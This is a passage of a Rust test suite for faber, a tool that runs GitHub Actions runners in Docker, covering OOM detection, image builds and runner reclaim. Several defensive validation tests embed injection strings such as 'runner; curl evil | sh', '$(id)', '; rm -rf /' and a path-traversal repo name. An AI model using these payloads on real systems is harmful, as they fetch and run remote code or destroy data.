        assert!(!dind_oom_verdict("dind", None, None));
        // A readable counter always wins: it is the non-hierarchical signal, so a
        // post-mortem never gets to overrule its zero.
        assert!(!dind_oom_verdict("dind", Some(0), Some(true)));
    }

    /// All three fields are load-bearing — each alone is a case that is *not* dind
    /// dying against its own ceiling.
    #[test]
    fn own_oom_needs_stopped_and_oomkilled_and_137_together() {
        assert_eq!(own_oom_from_state("false true 137\n"), Some(true));
        // Running: a nested container's kill latched the hierarchical flag while
        // dind itself sailed on — the misattribution this must never reproduce.
        assert_eq!(own_oom_from_state("true true 137\n"), Some(false));
        // Teardown's own `docker kill` also exits 137, but sets no OOM flag.
        assert_eq!(own_oom_from_state("false false 137\n"), Some(false));
        // Inherited flag, then an ordinary shutdown.
        assert_eq!(own_oom_from_state("false true 0\n"), Some(false));
        // A truncated or error reply is not a confident "no".
        assert_eq!(own_oom_from_state(""), None);
        assert_eq!(own_oom_from_state("false true\n"), None);
    }

    /// The sampler polls on a multi-second cadence, so it will miss the instant a
    /// kill happens. It stays correct because the kernel's counters are cumulative:
    /// any later read still carries the earlier event, and latching the maximum
    /// reproduces what a continuous observer would have seen.
    #[test]
    fn latching_a_cumulative_counter_survives_a_missed_poll() {
        let mut tally = None;
        // Poll 1: nothing yet. Between polls, a kill happens — unobserved.
        latch(&mut tally, parse_local_oom(NESTED_CONTAINER_OOM).unwrap());
        assert_eq!(tally, Some(0));
        // Poll 2, after the gap: the counter still reports it.
        latch(&mut tally, parse_local_oom(DIND_OWN_OOM).unwrap());
        assert_eq!(
            tally,
            Some(1),
            "a kill missed by the sampler is still counted"
        );

        // A high-water mark never regresses, so a later read cannot un-see it.
        latch(&mut tally, 0);
        assert_eq!(tally, Some(1));
        assert!(dind_oom_verdict("dind", tally, None));
    }

    /// A failed read must not clobber a reading already taken — the run where dind
    /// OOMs and *then* dies is exactly the one whose latch matters.
    #[test]
    fn a_failed_read_leaves_an_earlier_latch_alone() {
        let mut tally = None;
        latch(&mut tally, 1);
        // How the caller handles an unreadable sample: no latch at all.
        if let Some(t) = parse_local_oom("") {
            latch(&mut tally, t);
        }
        assert_eq!(
            tally,
            Some(1),
            "an unreadable poll must not erase the signal"
        );
        assert!(dind_oom_verdict("dind", tally, None));
    }

    #[test]
    fn fractional_cpus_render_with_decimal() {
        let mut args = Vec::new();
        ResourceLimits {
            cpus: 1.5,
            memory_mib: 0,
        }
        .push_args(&mut args);
        assert!(args.windows(2).any(|w| w == ["--cpus", "1.5"]));
        // memory unset → no memory flags.
        assert!(!args.iter().any(|s| s == "--memory"));
    }

    #[test]
    fn docker_config_defaults_to_the_runner_lifetime_cap() {
        // A fresh config is capped, not uncapped — the leak backstop is on by
        // default. `Duration::ZERO` (opt-out) must be a deliberate override.
        let c = DockerConfig::new("img".to_string());
        assert_eq!(c.runner_timeout, DEFAULT_RUNNER_TIMEOUT);
        assert!(!c.runner_timeout.is_zero());
    }

    // --- runner-image variants (ADR-0008) ----------------------------------

    fn variant_spec() -> VariantBuild<'static> {
        VariantBuild {
            recipe: crate::image::VARIANT_DOCKERFILE.as_bytes(),
            context: Path::new("/tmp/faber/runner-variant"),
            base: "ghcr.io/owner/my-runner:latest",
            base_id: "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            base_user: "runner",
            version: "1.61.1",
            tag: "faber-runner:0123456789ab-pw-1.61.1",
        }
    }

    #[test]
    fn a_variant_build_runs_on_the_legacy_builder_too() {
        // Without buildx the CLI falls back to the legacy builder, which refuses
        // `--progress` ("unknown flag") and fails every build before it starts.
        let a = build_variant_args(&variant_spec());
        assert!(!a.iter().any(|s| s.starts_with("--progress")), "{a:?}");
    }

    #[test]
    fn a_variant_build_never_resolves_its_base_remotely() {
        // The base is a local-only image that exists in no registry. A build that
        // decided to pull it would fail for a reason that has nothing to do with
        // the build, so `--pull=false` is asserted rather than assumed.
        let a = build_variant_args(&variant_spec());
        assert!(a.contains(&"--pull=false".to_string()));
    }

    #[test]
    fn faber_stamps_the_variant_s_identity_itself() {
        // What an image *is* — owner, kind, base, baked version — is a fact faber
        // asserts about something it built, not a line an operator's recipe has to
        // remember. The baked-version label especially: it is what makes the next
        // drift check read the variant as in sync instead of re-diagnosing what
        // was just healed.
        let a = build_variant_args(&variant_spec());
        for expected in [
            "org.faber.owned=true",
            "org.faber.kind=image",
            "org.faber.base=sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            "org.faber.playwright.version=1.61.1",
        ] {
            assert!(
                a.windows(2).any(|w| w == ["--label", expected]),
                "missing --label {expected}"
            );
        }
    }

    #[test]
    fn a_variant_build_passes_the_base_and_restores_its_user() {
        let a = build_variant_args(&variant_spec());
        for expected in [
            "BASE=ghcr.io/owner/my-runner:latest",
            "BASE_USER=runner",
            "PW_VERSION=1.61.1",
        ] {
            assert!(
                a.windows(2).any(|w| w == ["--build-arg", expected]),
                "missing --build-arg {expected}"
            );
        }
    }

    #[test]
    fn a_variant_build_ends_with_its_context() {
        // `docker build [flags] CONTEXT` — a context that drifted in front of a
        // flag would be read as that flag's value.
        let a = build_variant_args(&variant_spec());
        assert_eq!(a.first().unwrap(), "build");
        assert_eq!(a.last().unwrap(), "/tmp/faber/runner-variant");
    }

    #[test]
    fn a_variant_build_reads_its_recipe_from_stdin_never_from_a_path() {
        // ADR-0028 (#238): the recipe is read once, after its ownership check,
        // and the build is fed those bytes. A `--file <path>` would read it again.
        let a = build_variant_args(&variant_spec());
        let at = a.iter().position(|s| s == "--file").unwrap();
        assert_eq!(a[at + 1], "-");
        assert!(!a.iter().any(|s| s.ends_with("Dockerfile")), "{a:?}");
    }

    #[test]
    fn only_faber_built_images_are_ever_listed_for_removal() {
        // The safety property behind every image faber deletes. The operator's
        // base carries no faber labels at all, so a listing filtered on
        // `org.faber.kind=image` structurally cannot return it — and it must
        // never be returned: it exists in no registry, and removing it takes CI
        // down with nothing to re-pull.
        let a = variant_ls_args();
        assert!(a
            .windows(2)
            .any(|w| w == ["--filter", "label=org.faber.kind=image"]));
    }

    #[test]
    fn a_failed_build_reports_its_own_tail() {
        // An exit code alone names the step and destroys the account of what went
        // wrong at it — the same gap `infra_error` was built to close.
        let log = (1..=50)
            .map(|i| format!("#{i} step"))
            .collect::<Vec<_>>()
            .join("\n");
        let tail = tail_lines(&log, BUILD_LOG_TAIL);
        assert!(tail.ends_with("#50 step"));
        assert!(!tail.contains("#20 step"));
        assert_eq!(tail.split(" | ").count(), BUILD_LOG_TAIL);
    }

    #[test]
    fn a_short_build_log_is_carried_whole() {
        assert_eq!(tail_lines("only\n\nline", BUILD_LOG_TAIL), "only | line");
    }

    // --- ADR-0017: a reclaim asks the runner ---------------------------------

    #[test]
    fn a_worker_process_is_a_job_running_and_its_absence_is_not() {
        // The shapes `docker top <runner> -eo pid,comm` prints for a runner:
        // waiting for a job, and some way into one.
        let waiting = "PID                 COMMAND\n\
                       1000                su\n\
                       1100                run.sh\n\
                       1200                run-helper.sh\n\
                       1300                Runner.Listener\n";
        assert_eq!(activity_from_top(waiting), RunnerActivity::Idle);
        let working = "PID                 COMMAND\n\
                       2000                Runner.Listener\n\
                       2100                Runner.Worker\n\
                       2200                npm exec build\n\
                       2300                chromium\n";
        assert_eq!(activity_from_top(working), RunnerActivity::Executing);
        // A retitled process with spaces in its name is read whole, and only an
        // exact worker name counts.
        assert_eq!(
            activity_from_top("PID COMMAND\n12 Runner.Worker helper\n"),
            RunnerActivity::Idle
        );
        // Nothing but a header: still starting, not working.
        assert_eq!(activity_from_top("PID COMMAND\n"), RunnerActivity::Idle);
    }

    /// Drive [`reclaim_clearance`] with a scripted process table (one reading per
    /// look) and a scripted withdrawal, returning the clearance and whether GitHub
    /// was asked at all.
    async fn clearance_for(looks: &[RunnerActivity], withdrawal: Withdrawal) -> (Clearance, bool) {
        let looks = std::sync::Mutex::new(looks.iter().copied());
        let asked = AtomicBool::new(false);
        let clearance = reclaim_clearance(
            || {
                let next = looks
                    .lock()
                    .unwrap()
                    .next()
                    .expect("looked more than scripted");
                async move { next }
            },
            || async {
                asked.store(true, Ordering::SeqCst);
                withdrawal
            },
        )
        .await;
        (clearance, asked.load(Ordering::SeqCst))
    }

    #[tokio::test]
    async fn a_runner_with_a_job_running_in_it_is_never_cleared() {
        use RunnerActivity::*;
        // The process table says a job is running: refused, and GitHub is not even
        // asked — the runner list that said "idle" is exactly what is not trusted.
        let (c, asked) = clearance_for(&[Executing], Withdrawal::Withdrawn).await;
        assert!(matches!(c, Clearance::Refused(_)), "{c:?}");
        assert!(!asked, "a runner with a job in it must not be deregistered");

        // No worker yet, but GitHub has already assigned it a job (the listener has
        // not spawned the worker): refused on GitHub's word.
        let (c, asked) = clearance_for(&[Idle], Withdrawal::JobAssigned).await;
        assert!(matches!(c, Clearance::Refused(_)), "{c:?}");
        assert!(asked);

        // It accepted a job in the instant before the withdrawal landed: the second
        // look catches it.
        let (c, _) = clearance_for(&[Idle, Executing], Withdrawal::Withdrawn).await;
        assert!(matches!(c, Clearance::Refused(_)), "{c:?}");
    }

    #[tokio::test]
    async fn an_unreadable_signal_never_clears_a_runner() {
        use RunnerActivity::*;
        for (looks, withdrawal) in [
            (vec![Unknown], Withdrawal::Withdrawn),
            (
                vec![Idle],
                Withdrawal::Failed("GitHub unreachable".to_string()),
            ),
            (vec![Idle, Unknown], Withdrawal::Withdrawn),
        ] {
            let (c, _) = clearance_for(&looks, withdrawal.clone()).await;
            assert!(
                matches!(c, Clearance::Refused(_)),
                "{looks:?}/{withdrawal:?} must refuse, got {c:?}"
            );
        }
    }

    #[tokio::test]
    async fn a_genuinely_idle_runner_is_still_cleared() {
        use RunnerActivity::*;
        // The whole point of reclaiming survives: no worker before or after, and
        // GitHub agreed to forget it.
        let (c, asked) = clearance_for(&[Idle, Idle], Withdrawal::Withdrawn).await;
        assert_eq!(c, Clearance::Idle);
        assert!(asked, "an idle runner is withdrawn before it is killed");
        // A container that has already stopped needs no withdrawal and no kill.
        let (c, asked) = clearance_for(&[Stopped], Withdrawal::Withdrawn).await;
        assert_eq!(c, Clearance::Stopped);
        assert!(!asked);
    }

    fn exit_ok() -> std::io::Result<std::process::ExitStatus> {
        use std::os::unix::process::ExitStatusExt;
        Ok(std::process::ExitStatus::from_raw(0))
    }

    #[tokio::test]
    async fn a_refused_request_leaves_the_run_going_until_it_ends_on_its_own() {
        let (tx, mut rx) = watch::channel(false);
        let (finish, finished) = tokio::sync::oneshot::channel::<()>();
        let consulted = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let watch = tokio::spawn({
            let consulted = consulted.clone();
            async move {
                let run = async move {
                    let _ = finished.await;
                    exit_ok()
                };
                await_end(run, Duration::ZERO, &mut rx, || {
                    consulted.fetch_add(1, Ordering::SeqCst);
                    async { Clearance::Refused("a job is running in it".to_string()) }
                })
                .await
            }
        });
        // Each request is answered, none ends the run — including a repeat of a
        // request already refused while the flag was still `true`.
        for n in 1..=3 {
            tx.send_replace(true);
            while consulted.load(Ordering::SeqCst) < n {
                tokio::task::yield_now().await;
            }
            assert!(
                !watch.is_finished(),
                "request {n} ended a run it was refused"
            );
        }
        finish.send(()).unwrap();
        let end = watch.await.unwrap();
        assert!(matches!(end, RunEnd::Ran(Ok(_))), "{end:?}");
        assert_eq!(consulted.load(Ordering::SeqCst), 3);
    }

    #[tokio::test]
    async fn a_cleared_request_ends_the_run_as_reclaimed() {
        let (tx, mut rx) = watch::channel(false);
        tx.send_replace(true);
        // Standing when the watch began (sent while the container was launching):
        // answered, not skipped.
        let end = await_end(std::future::pending(), Duration::ZERO, &mut rx, || async {
            Clearance::Idle
        })
        .await;
        assert!(matches!(end, RunEnd::Reclaimed), "{end:?}");
    }

    #[tokio::test(start_paused = true)]
    async fn a_stopped_container_is_given_the_chance_to_report_its_own_exit() {
        // It exited as the request arrived: recorded as the run it was.
        let (tx, mut rx) = watch::channel(true);
        let (finish, finished) = tokio::sync::oneshot::channel::<()>();
        let run = async move {
            let _ = finished.await;
            exit_ok()
        };
        let end = await_end(run, Duration::ZERO, &mut rx, || {
            let _ = &tx;
            async { Clearance::Stopped }
        });
        tokio::pin!(end);
        tokio::select! {
            biased;
            _ = &mut end => panic!("ended before the stopped run could report"),
            _ = tokio::task::yield_now() => {}
        }
        finish.send(()).unwrap();
        assert!(matches!(end.await, RunEnd::Ran(Ok(_))));

        // A client that never returns (wedged) does not hold the claim open.
        let (_tx, mut rx) = watch::channel(true);
        let end = await_end(std::future::pending(), Duration::ZERO, &mut rx, || async {
            Clearance::Stopped
        })
        .await;
        assert!(matches!(end, RunEnd::Reclaimed), "{end:?}");
    }

    #[tokio::test(start_paused = true)]
    async fn the_lifetime_cap_still_ends_a_run_nobody_reclaims() {
        let (_tx, mut rx) = watch::channel(false);
        let end = await_end(
            std::future::pending(),
            Duration::from_secs(3 * 60 * 60),
            &mut rx,
            || async { Clearance::Idle },
        )
        .await;
        assert!(matches!(end, RunEnd::CapExpired), "{end:?}");
    }

    #[tokio::test(start_paused = true)]
    async fn a_dropped_sender_is_never_read_as_a_request() {
        let (tx, mut rx) = watch::channel(false);
        drop(tx);
        let end = await_end(
            std::future::pending(),
            Duration::from_secs(60),
            &mut rx,
            || async { Clearance::Idle },
        )
        .await;
        assert!(
            matches!(end, RunEnd::CapExpired),
            "a dropped sender must not reclaim, got {end:?}"
        );
    }

    // --- #105: the daemon is untrusted ---------------------------------------

    /// A stand-in for api.github.com that records every request line and answers
    /// each with the next scripted `(status, body)`, closing the connection once
    /// the script runs out.
    async fn recording_api(
        script: Vec<(u16, &'static str)>,
    ) -> (String, Arc<std::sync::Mutex<Vec<String>>>) {
        let script = std::sync::Mutex::new(script.into_iter());
        routed_api(move |_| script.lock().unwrap().next()).await
    }

    /// [`recording_api`] answering each request with what `route` gives for its
    /// request line (`None` closes the connection unanswered), so a test can act
    /// at the moment a request arrives.
    async fn routed_api<R>(route: R) -> (String, Arc<std::sync::Mutex<Vec<String>>>)
    where
        R: Fn(&str) -> Option<(u16, &'static str)> + Send + 'static,
    {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let seen = Arc::new(std::sync::Mutex::new(Vec::new()));
        let log = seen.clone();
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = Vec::new();
                let mut chunk = [0u8; 1024];
                while !request_complete(&buf) {
                    match sock.read(&mut chunk).await {
                        Ok(0) | Err(_) => break,
                        Ok(n) => buf.extend_from_slice(&chunk[..n]),
                    }
                }
                let head = String::from_utf8_lossy(&buf).into_owned();
                let line = head.lines().next().unwrap_or_default();
                let request = line.rsplit_once(' ').map_or(line, |(r, _)| r).to_string();
                log.lock().unwrap().push(request.clone());
                let Some((status, body)) = route(&request) else {
                    continue;
                };
                let resp = format!(
                    "HTTP/1.1 {status} X\r\nContent-Type: application/json\r\n\
                     Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = sock.write_all(resp.as_bytes()).await;
                let _ = sock.flush().await;
            }
        });
        (base, seen)
    }

    /// Whether `buf` holds a whole request, its `Content-Length` of body included.
    /// A socket closed with a request body still unread can be reset rather than
    /// closed, and the client may then lose the answer it was sent.
    fn request_complete(buf: &[u8]) -> bool {
        let Some(end) = buf.windows(4).position(|w| w == b"\r\n\r\n") else {
            return false;
        };
        let head = String::from_utf8_lossy(&buf[..end]).to_ascii_lowercase();
        let body_len = head
            .lines()
            .find_map(|l| l.strip_prefix("content-length:"))
            .and_then(|v| v.trim().parse::<usize>().ok())
            .unwrap_or(0);
        buf.len() >= end + 4 + body_len
    }

    /// The rule at its point of enforcement: a runner no record of faber's own
    /// vouches for — an adopted container claiming any repo and any runner name it
    /// likes — is never withdrawn, and GitHub is not even asked.
    #[tokio::test]
    async fn a_runner_no_record_vouches_for_is_never_withdrawn() {
        let (base, seen) = recording_api(Vec::new()).await;
        let gh = Github::at(base);
        let reg = Registration {
            gh: &gh,
            minted: None,
        };
        assert_eq!(
            withdraw_registration(&reg, RECLAIM_WITHDRAWAL).await,
            Withdrawal::Failed(NO_MINT_RECORD.to_string())
        );
        assert!(
            seen.lock().unwrap().is_empty(),
            "no request may reach GitHub"
        );

        // And so a reclaim of it is refused, whatever its process table says.
        let clearance = reclaim_clearance(
            || async { RunnerActivity::Idle },
            || withdraw_registration(&reg, RECLAIM_WITHDRAWAL),
        )
        .await;
        assert!(matches!(clearance, Clearance::Refused(_)), "{clearance:?}");
        assert!(seen.lock().unwrap().is_empty());
    }

    /// With a record, the withdrawal targets exactly what the record names: its
    /// repo, and the registration GitHub lists under its exact name.
    #[tokio::test]
    async fn a_recorded_runner_is_withdrawn_by_what_the_record_names() {
        let listed = r#"{"total_count":1,"runners":[{"id":30543,"name":"faber-7-1000","status":"online","busy":false,"labels":[]}]}"#;
        let (base, seen) = recording_api(vec![(200, listed), (204, "")]).await;
        let gh = Github::at(base);
        let reg = Registration {
            gh: &gh,
            minted: MintedRunner::recorded("owner/demo", "faber-7-1000"),
        };
        assert_eq!(
            withdraw_registration(&reg, RECLAIM_WITHDRAWAL).await,
            Withdrawal::Withdrawn
        );
        assert_eq!(
            *seen.lock().unwrap(),
            vec![
                "GET /repos/owner/demo/actions/runners?name=faber-7-1000",
                "DELETE /repos/owner/demo/actions/runners/30543",
            ]
        );
    }

    #[test]
    fn a_record_is_held_to_fabers_own_form() {
        let m = MintedRunner::recorded("owner/demo", "faber-7-1000").expect("faber's own");
        assert_eq!((m.repo(), m.name()), ("owner/demo", "faber-7-1000"));
        for (repo, name) in [
            ("x/../../orgs/victim", "faber-7-1000"),
            ("owner/demo", "faber-7-1000&per_page=1"),
            ("owner/demo", "faber-runner-7-1000"),
            ("owner/demo", "someone-elses-runner"),
            ("owner/demo", "faber-7"),
        ] {
            assert_eq!(MintedRunner::recorded(repo, name), None, "{repo} {name}");
        }
    }

    /// The `sh -c` faber hands the probe container is a constant: the probe image
    /// (the operator's config) is its own argument, and nothing the daemon said is
    /// anywhere in the script.
    #[test]
    fn the_vm_disk_probe_never_pulls_and_reads_the_overlay_root() {
        // #410: a disk too full to read is not one to pull onto, and the overlay
        // root reports the filesystem Docker's data root is on.
        assert_eq!(
            vm_disk_probe_args("busybox"),
            [
                "run",
                "--rm",
                "--pull=never",
                "--network=none",
                "--read-only",
                "busybox",
                "df",
                "-kP",
                "/"
            ]
        );
        // busybox's `df -kP /` in a container on a full Linux VM disk.
        let full = "Filesystem           1024-blocks    Used Available Capacity Mounted on\n\
                    overlay                67108864  67092480      16384 100% /\n";
        assert_eq!(crate::host::parse_df_avail_mib(full), Some(16));
    }

    #[test]
    fn the_vm_pressure_probe_script_is_a_constant() {
        // ADR-0061 §7: sizes are read from labels, never from names.
        assert_eq!(parse_docker_size("1.5GB"), Some(1.5e9));
        assert_eq!(parse_docker_size("512B"), Some(512.0));
        assert_eq!(parse_docker_size("N/A"), None);
        let u = usage_from(
            r#"[{"Name":"faber-cache-a","Labels":"org.faber.kind=cache,org.faber.repo=owner/demo","Size":"2.147483648GB"},{"Name":"looks-like-cache","Labels":"","Size":"9GB"},{"Name":"m","Labels":"org.faber.kind=git-mirror","Size":"1.073741824GB"}]"#,
            "1.073741824GB\n",
        );
        assert_eq!(u.cache_volumes_gib, [2.0]);
        assert_eq!((u.git_mirrors_gib, u.variants_gib), (1.0, 1.0));
        // ADR-0061 §5: the resize runs only the pinned image, with no network.
        let grow = grow_args();
        assert!(grow.contains(&"--network=none") && grow.contains(&"--privileged"));
        assert!(
            grow.contains(&"--pull=never"),
            "pulled only by ensure_grow_image"
        );
        assert_eq!(
            grow.iter()
                .filter(|a| a.contains("busybox"))
                .collect::<Vec<_>>(),
            [&GROW_IMAGE]
        );
        assert!(GROW_IMAGE.contains("@sha256:") && GROW_IMAGE_IDS.contains(&&GROW_IMAGE[8..]));
        assert_eq!(parse_grow_report("faber-grow: nothing-left\n"), Ok(()));
        assert!(parse_grow_report("faber-grow: missing growpart\n")
            .unwrap_err()
            .contains("missing growpart"));
        assert!(parse_grow_report("").is_err());
        assert!(GROW_SCRIPT.contains("findmnt") && !GROW_SCRIPT.contains("/dev/vda"));
        let args = vm_pressure_probe_args("busybox:latest");
        let c = args.iter().position(|a| *a == "-c").expect("sh -c");
        assert_eq!(args[c + 1], VM_PRESSURE_SCRIPT);
        assert_eq!(c + 2, args.len(), "nothing follows the script");
        assert_eq!(args[2], "busybox:latest");
    }

    #[test]
    fn vm_sizes_outside_any_vm_are_refused() {
        // Example sizes: a VM with 16 GiB of memory and 8 cores.
        assert_eq!(mem_total_mib("17179869184\n").unwrap(), 16 * 1024);
        for bad in ["", "-1", "1e12", "1024", "18446744073709551615"] {
            assert!(mem_total_mib(bad).is_err(), "{bad:?}");
        }
        assert_eq!(ncpu("8\n").unwrap(), 8);
        for bad in ["0", "-2", "4097", "ten"] {
            assert!(ncpu(bad).is_err(), "{bad:?}");
        }
    }

    /// #105: a memory reading no VM could give admits less, never more. Available
    /// memory past any VM reads as no headroom, which holds Gate 2; dropped, it
    /// would fail the probe, which Gate 2 reads as unknown and skips. A peak past
    /// any VM widens its class's cap to the most there is.
    #[test]
    fn a_memory_reading_no_vm_could_give_admits_less_never_more() {
        assert_eq!(
            parse_mem_available_kib("MemAvailable:   16777216 kB"),
            Some(16777216)
        );
        assert_eq!(
            parse_mem_available_kib("MemAvailable: 99999999999999999 kB"),
            Some(0)
        );
        for bad in ["MemAvailable: -5 kB", "MemAvailable: 1e9 kB"] {
            assert_eq!(parse_mem_available_kib(bad), None, "{bad}");
        }
        assert_eq!(parse_mem_usage_mib("1.5GiB / 20GiB"), Some(1536));
        assert_eq!(
            parse_mem_usage_mib("99999999999999999999GiB / 1GiB"),
            Some(untrusted::MAX_MEM_MIB)
        );
        for bad in [
            "infGiB / 1GiB",
            "NaN MiB / 1GiB",
            "-5MiB / 1GiB",
            "1e30GiB / 1GiB",
        ] {
            assert_eq!(parse_mem_usage_mib(bad), None, "{bad}");
        }
    }

    /// ADR-0033 §5. `memory.events` of the container's cgroup, hierarchical.
    const CAP_BREACH: &str = "low 0\nhigh 0\nmax 10\noom 1\noom_kill 1\n";
    const HOST_KILL: &str = "low 0\nhigh 0\nmax 0\noom 0\noom_kill 1\n";
    const NESTED_OWN_LIMIT: &str = "low 0\nhigh 0\nmax 5\noom 2\noom_kill 2\n";
    const QUIET: &str = "low 0\nhigh 0\nmax 200\noom 0\noom_kill 0\n";

    #[test]
    fn a_kill_with_no_limit_breached_is_a_host_oom() {
        let host = parse_mem_events(HOST_KILL).unwrap();
        assert_eq!(
            host,
            MemEvents {
                oom: 0,
                oom_kill: 1
            }
        );
        assert!(host.is_host_oom());
    }

    #[test]
    fn a_cap_breach_is_not_a_host_oom() {
        // The container's own limit was breached: `oom` is raised, so this is a
        // class OOM whatever else was killed.
        assert!(!parse_mem_events(CAP_BREACH).unwrap().is_host_oom());
        // A nested container hitting its own small limit raises `oom` in every
        // ancestor, so dind sees it as a breach, not a host kill.
        assert!(!parse_mem_events(NESTED_OWN_LIMIT).unwrap().is_host_oom());
        // Pressure alone (`max`) kills nothing.
        assert!(!parse_mem_events(QUIET).unwrap().is_host_oom());
    }

    #[test]
    fn an_unreadable_or_partial_memory_events_is_no_answer() {
        assert_eq!(parse_mem_events(""), None);
        assert_eq!(parse_mem_events("oom 0\n"), None, "oom_kill missing");
        assert_eq!(parse_mem_events("oom_kill 1\n"), None, "oom missing");
        assert_eq!(parse_mem_events("oom x\noom_kill 1\n"), None);
    }

    /// Both counters are cumulative, so the high-water mark across sparse polls is
    /// what a continuous observer would have seen — including a host kill that a
    /// later cap breach then overrides.
    #[test]
    fn latched_events_classify_on_the_whole_run() {
        let mut slot = None;
        latch_events(&mut slot, parse_mem_events(QUIET).unwrap());
        assert!(!slot.unwrap().is_host_oom());
        latch_events(&mut slot, parse_mem_events(HOST_KILL).unwrap());
        assert!(slot.unwrap().is_host_oom());
        // The breach arrives later: the run is a cap OOM after all.
        latch_events(&mut slot, parse_mem_events(CAP_BREACH).unwrap());
        assert!(!slot.unwrap().is_host_oom());
        // A reading that regresses (a fresh cgroup, a miss) never un-sees it.
        latch_events(&mut slot, parse_mem_events(QUIET).unwrap());
        assert_eq!(
            slot,
            Some(MemEvents {
                oom: 1,
                oom_kill: 1
            })
        );
    }

    #[test]
    fn dinds_two_files_come_back_from_one_read() {
        let text = format!("{DIND_OWN_OOM}@@faber-split@@\n{HOST_KILL}");
        let (tally, events) = split_dind_counters(&text);
        assert_eq!(tally, Some(1));
        assert!(events.unwrap().is_host_oom());
        // No marker: the local half still parses, the hierarchical one is no answer.
        assert_eq!(split_dind_counters(DIND_OWN_OOM), (Some(1), None));
    }

    #[test]
    fn an_oom_tally_cannot_overflow() {
        let max = u64::MAX;
        assert_eq!(
            parse_local_oom(&format!("oom {max}\noom_kill {max}\n")),
            Some(u64::MAX)
        );
        assert_eq!(parse_local_oom("oom +3\n"), None, "a sign is not a count");
    }

    #[test]
    fn an_exit_code_is_a_byte() {
        assert_eq!(exit_code("0\n"), Some(0));
        assert_eq!(exit_code("137"), Some(137));
        for bad in ["", "-1", "256", "2147483648", "1;id"] {
            assert_eq!(exit_code(bad), None, "{bad:?}");
        }
    }

    #[test]
    fn a_base_user_that_is_not_a_user_value_builds_nothing() {
        let user = |u: &str| {
            user_of(ImageConfig {
                user: u.to_string(),
            })
        };
        assert_eq!(user(""), Ok("root".to_string()), "none declared is root");
        assert_eq!(user("1001:1001"), Ok("1001:1001".to_string()));
        assert_eq!(user("runner"), Ok("runner".to_string()));
        for bad in ["runner; curl evil | sh", "$(id)", "a b"] {
            assert!(user(bad).is_err(), "{bad:?}");
        }
    }

    /// The two daemon-supplied values of a build are checked before the build runs,
    /// so a hostile one never reaches `docker build`'s command line at all.
    #[test]
    fn a_variant_build_refuses_daemon_values_it_cannot_vouch_for() {
        let good = variant_spec();
        assert!(check_variant_build(&good).is_ok());
        let bad_user = VariantBuild {
            base_user: "root\nRUN curl evil | sh",
            ..variant_spec()
        };
        assert!(check_variant_build(&bad_user).is_err());
        let bad_id = VariantBuild {
            base_id: "sha256:abc; id",
            ..variant_spec()
        };
        assert!(check_variant_build(&bad_id).is_err());
    }

    /// #113: the version is the repo's, and npm reads a package spec after `@`.
    #[test]
    fn a_variant_build_refuses_a_version_npm_would_read_as_another_package() {
        let spec = VariantBuild {
            version: "npm:evil@1.0.0",
            ..variant_spec()
        };
        let err = check_variant_build(&spec).unwrap_err().to_string();
        assert!(err.contains("14 bytes"), "{err}");
        assert!(
            !err.contains("evil"),
            "the value itself is never echoed: {err}"
        );
    }

    #[test]
    fn subnets_are_read_from_json_and_junk_is_no_subnet() {
        let text = [
            r#"[{"Subnet":"172.17.0.0/16","Gateway":"172.17.0.1"}]"#,
            "null",
            r#"[{"Subnet":"fd00::/64"},{"Subnet":"10.63.4.0/24"}]"#,
            r#"[{"Subnet":"; rm -rf /"}]"#,
            "not json",
        ]
        .join("\n");
        let got: Vec<String> = subnets_from_ipam(&text)
            .iter()
            .map(|c| c.to_string())
            .collect();
        assert_eq!(got, vec!["172.17.0.0/16", "10.63.4.0/24"]);
    }

    #[test]
    fn the_preflight_reports_unlabelled_runners_and_nothing_else() {
        let text = [
            r#"{"Name":"faber-runner-1-2","Reserved":"9216"}"#,
            r#"{"Name":"faber-runner-3-4","Reserved":""}"#,
            r#"{"Name":"myproj-faber-runner-1","Reserved":""}"#,
        ]
        .join("\n");
        assert_eq!(
            unlabelled_from(&text),
            Some(vec!["faber-runner-3-4".to_string()])
        );
        // #105: a runner of faber's it cannot read is one it cannot judge, so the
        // preflight cannot tell, and drains, rather than restart past it.
        for bad in [
            r#"{"Name":"faber-runner-5-6;id","Reserved":""}"#,
            "not json",
        ] {
            assert_eq!(unlabelled_from(&format!("{text}\n{bad}")), None, "{bad}");
        }
    }

    #[test]
    fn only_names_and_refs_in_dockers_own_alphabet_are_ever_removed() {
        let lines = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        assert_eq!(
            image_refs(
                lines(&[
                    "faber-runner:abc-pw-1.61.1",
                    "<none>:<none>",
                    "--force",
                    "a b:c"
                ]),
                "test"
            ),
            vec!["faber-runner:abc-pw-1.61.1"]
        );
        assert_eq!(
            volume_names(
                lines(&["faber-cache-owner-demo", "/", "a:/etc", "-rf"]),
                "test"
            ),
            vec!["faber-cache-owner-demo"]
        );
    }

    // --- #269: a reclaim after the JIT mint withdraws what it minted ----------

    /// The mint's answer for `faber-7-1000`: its JIT config, and the id of the
    /// registration GitHub created for it.
    const MINTED: &str = r#"{"runner":{"id":30543,"name":"faber-7-1000","os":"unknown","status":"offline","busy":false,"labels":[]},"encoded_jit_config":"eyJhIjoxfQ=="}"#;

    /// [`run_one`] for runner `faber-7-1000` on `owner/demo`, against the GitHub at
    /// `base`, with `cancel` as its reclaim signal. Every seam these tests reach
    /// comes before the first `docker` call, so no daemon is needed.
    async fn provision(base: String, cancel: watch::Receiver<bool>) -> RunReport {
        let gh = Github::at(base);
        run_one(
            &gh,
            "owner/demo",
            "faber-7-1000",
            &["docker".to_string()],
            &cfg(),
            &Limits::default(),
            &ClaimMarks::default(),
            cancel,
        )
        .await
        .expect("a reclaim is an outcome, not an error")
    }

    /// Before the mint there is nothing on GitHub to withdraw, and a reclaim there
    /// writes nothing to it.
    #[tokio::test]
    async fn a_reclaim_before_the_mint_writes_nothing_to_github() {
        let (base, seen) = recording_api(Vec::new()).await;
        let (_reclaim, cancel) = watch::channel(true);
        let report = provision(base, cancel).await;
        assert!(report.reclaimed);
        assert_eq!(
            report.cause.as_deref(),
